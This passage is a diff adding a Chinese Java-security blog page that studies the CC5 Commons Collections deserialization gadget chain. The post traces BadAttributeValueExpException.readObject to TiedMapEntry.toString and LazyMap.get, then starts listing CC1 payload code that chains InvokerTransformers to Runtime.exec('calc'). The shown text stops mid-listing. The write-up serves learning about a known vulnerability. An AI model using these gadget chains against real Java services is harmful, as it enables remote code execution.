@@ -1,0 +1,1237 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><progress id="content_progress" value="0"></progress><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/pig.png">
+  <link rel="icon" href="/img/pig.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#3F4B3B">
+  <meta name="author" content="Piggy Sprint">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CC5&amp;CC7">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC5&amp;CC7">
+<meta property="og:url" content="http://example.com/2025/12/04/CC5&CC7/index.html">
+<meta property="og:site_name" content="Piggy Sprint&#39;s blog">
+<meta property="og:description" content="CC5&amp;CC7">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204172650129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204195317499.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204195919153.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204200153551.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204200902652.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204203911558.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204211143574.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204211926847.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204212545679.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204213546541.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204212701738.png">
+<meta property="article:published_time" content="2025-12-04T12:00:00.000Z">
+<meta property="article:modified_time" content="2025-12-04T13:55:15.899Z">
+<meta property="article:author" content="Piggy Sprint">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204172650129.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>CC5&amp;CC7 - Piggy Sprint&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+
+
+  
+<link rel="stylesheet" href="/custom/LoadingBar/pace-theme-barber-shop.css">
+<link rel="stylesheet" href="/css/cloudedGlass.css">
+<link rel="stylesheet" href="/custom/ReadingProgress/ReadingProgress.css">
+<link rel="stylesheet" href="/css/Loadanimation.css">
+<link rel="stylesheet" href="/css/StrongInDark.css">
+<link rel="stylesheet" href="/css/TitleNeon.css">
+<link rel="stylesheet" href="/css/TitleGradient.css">
+<link rel="stylesheet" href="/css/ScrollBar.css">
+<link rel="stylesheet" href="https://lib.baomitu.com/font-awesome/6.1.2/css/all.min.css">
+<link rel="stylesheet" href="/css/CodeBlock.css">
+<link rel="stylesheet" href="/css/CodeInLine.css">
+<link rel="stylesheet" href="/css/RandomBanner.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+<link rel="stylesheet" href="/css/Background.css">
+<link rel="stylesheet" href="/css/FrostedGlassBg.css">
+<link rel="stylesheet" href="/css/Sidebar.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"7H0Tkmd6gbla1cOeZ7rS44zF-gzGzoHsz","app_key":"byZ7eSN7DH9MXIyDyXwXE8SE","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+  <script src="/js/backgroundize.js"></script>
+  <script src="/js/injector.js"></script>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-shiki-plugin@latest/lib/codeblock.css">
+<style>:root{--hl-color:#abb2bf;--hl-bg:#282c34;--hltools-bg:#21252b;--hltools-color:#bbbbbc;--hlnumber-bg:#282c34;--hlnumber-color:#495162;--hlscrollbar-bg:#373c47;--hlexpand-bg:linear-gradient(180deg,rgba(40,44,52,0.1),rgba(40,44,52,0.9))}</style>
+    <style>
+    .code-expand-btn:not(.expand-done) ~ div.codeblock,
+    .code-expand-btn:not(.expand-done) ~ * div.codeblock {
+      overflow: hidden;
+      height: 360px;
+    }
+    </style>
+  <!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  <div id="loader-container"> 
+    <div id="loader" class="loader"></div>
+    <div class="loader-inner">
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+        <div class="loader-line-wrap">
+            <div class="loader-line"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/js/RainbowLoading.js" type="text/javascript"></script>
+<link href="/css/RainbowLoading.css" type="text/css" rel="stylesheet"/>
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"> 🐽🐽 Piggy Sprint &#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner/random.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CC5&amp;CC7"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-04 20:00" pubdate>
+          2025年12月4日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          16 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CC5&amp;CC7</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><blockquote>
+<p>和cc1类似就是lazymap.get的触发变了</p>
+<p>把cc1的Proxy(annotationinvocationHandler).xxx——————————————LazyMap.get</p>
+<p>变成了BadAttributeValueExpException.readObject—-TiedMapEntry.toString—LazyMap.get</p>
+</blockquote>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251204172650129.png" srcset="/img/loading.gif" lazyload alt="image-20251204172643016"></p>
+<ul>
+<li><p><code>TiedMapEntry</code>类中的<code>toString</code>方法</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">toString</span><span style="color: #E06C75">() {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getKey</span><span style="color: #E06C75">() </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;=&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getValue</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<p>返回了以及getValue()</p>
+<ul>
+<li><p><code>getValue()</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getValue</span><span style="color: #E06C75">() {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(key);</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p><code>getKey</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getKey</span><span style="color: #E06C75">() {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> key</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li>
+</ul>
+<p><code>getValue()</code>就和cc1一样了</p>
+<p>后面调用<code>map.get()</code></p>
+<p>又到 <code>lazymap.get</code></p>
+</li>
+<li><p>我们继续往前找，看toString的用法（直接找一个类下的<code>readObject</code>）</p>
+<p>找到了<code>BadAttributeValueExpException</code>类的<code>readObject</code></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">readObject</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #E06C75"> ois) throws IOException</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> ClassNotFoundException {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">ObjectInputStream</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">GetField</span><span style="color: #E06C75"> gf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ois</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">readFields</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> valObj </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">gf</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;val&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (valObj </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #E06C75">) {</span></span>
+<span class="line"><span style="color: #E06C75">        val </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> String) {</span></span>
+<span class="line"><span style="color: #E06C75">        val</span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> valObj</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSecurityManager</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #D19A66">null</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Long</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Integer</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Float</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Double</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Byte</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Short</span></span>
+<span class="line"><span style="color: #E06C75">            </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> valObj </span><span style="color: #C678DD">instanceof</span><span style="color: #E06C75"> Boolean) {</span></span>
+<span class="line"><span style="color: #E06C75">        val </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">valObj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">toString</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75">                    </span><span style="color: #7F848E; font-style: italic">//toString()在这里</span></span>
+<span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> { </span><span style="color: #7F848E; font-style: italic">// the serialized object is from a version without JDK-8019292 fix</span></span>
+<span class="line"><span style="color: #E06C75">        val </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">identityHashCode</span><span style="color: #ABB2BF">(valObj)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #98C379">&quot;@&quot;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">valObj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getClass</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">getName</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #E06C75">    }</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li>
+</ul>
+<h2 id="构建"><a href="#构建" class="headerlink" title="构建"></a>构建</h2><ul>
+<li><p>先看一下cc1的</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">CC1Test2</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">ClassNotFoundException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InvocationTargetException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">InstantiationException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IllegalAccessException</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">NoSuchMethodException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75">transformers</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Transformer</span><span style="color: #ABB2BF">[]{</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ConstantTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;getMethod&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;getRuntime&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;invoke&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[].</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">}),</span></span>
+<span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InvokerTransformer</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;exec&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">[]{</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">}, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">})</span></span>
+<span class="line"><span style="color: #ABB2BF">        };</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">ChainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">chainedTransformer</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ChainedTransformer</span><span style="color: #ABB2BF">(transformers);</span></span>
+<span class="line"></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">map</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">HashMap</span><span style="color: #ABB2BF">&lt;&gt;();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">&lt;</span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Object</span><span style="color: #ABB2BF">&gt; </span><span style="color: #E06C75">lazyMap</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LazyMap</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">decorate</span><span style="color: #ABB2BF">(map, chainedTransformer);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">forName</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Constructor</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">annotationInvocationhdlConstructor</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">c</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getDeclaredConstructor</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Class</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">Map</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">class</span><span style="color: #ABB2BF">);</span></span>
